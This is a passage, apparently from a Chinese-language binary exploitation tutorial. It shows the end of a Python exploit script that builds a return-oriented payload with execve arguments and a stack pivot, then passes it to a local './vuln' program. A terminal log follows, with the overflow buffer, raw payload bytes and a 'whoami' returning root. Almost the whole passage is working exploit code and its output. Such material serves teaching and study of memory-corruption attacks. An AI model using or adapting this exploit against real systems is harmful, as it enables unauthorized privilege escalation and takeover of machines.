buf += conv(execve_argv_dst)
buf += conv(execve_null_arg)

#Stack Pivot
buf += conv(pr_addr)
buf += conv(cust_base_esp)
buf += conv(lr_addr)

print "Calling vulnerable program"
call(["./vuln", buf])

```

​	执行上述代码得到root shell：

```python
user@ubuntu:~/project$ python exp.py 
Calling vulnerable program
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��ﾭ�ﾭ�ﾭ�ͅﾭހ�����ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭޢ�@���0�����Ѓ΅d�ˁЃ΅e�U�Ѓ΅f�0�Ѓ΅g�C�Ѓ΅h�܃Ѓ΅i�U�Ѓ΅j�0�Ѓ΅k�C�Ѓ΅l�`�Ѓ΅m�`�Ѓ΅n�`�Ѓ΅o�`�Ѓ΅p���Ѓ΅q�Ѓ΅r�0�Ѓ΅s�C�Ѓ΅t���Ѓ΅u�Ѓ΅v�0�Ѓ΅w�C�Ѓ΅x�`�Ѓ΅y�`�Ѓ΅z�`�Ѓ΅{�`�Ѓ΅��T�Ѓ΅��W�Ѓ΅��V�Ѓ΅��^�Ѓ΅��T�Ѓ΅��b�Ѓ΅����Ѓ΅����Ѓ΅��Ѓ΅��0�Ѓ΅��C�Ѓ΅��`�Ѓ΅��`�Ѓ΅��`�Ѓ΅��`���`�i�
Len:1008
# whoami
root
```

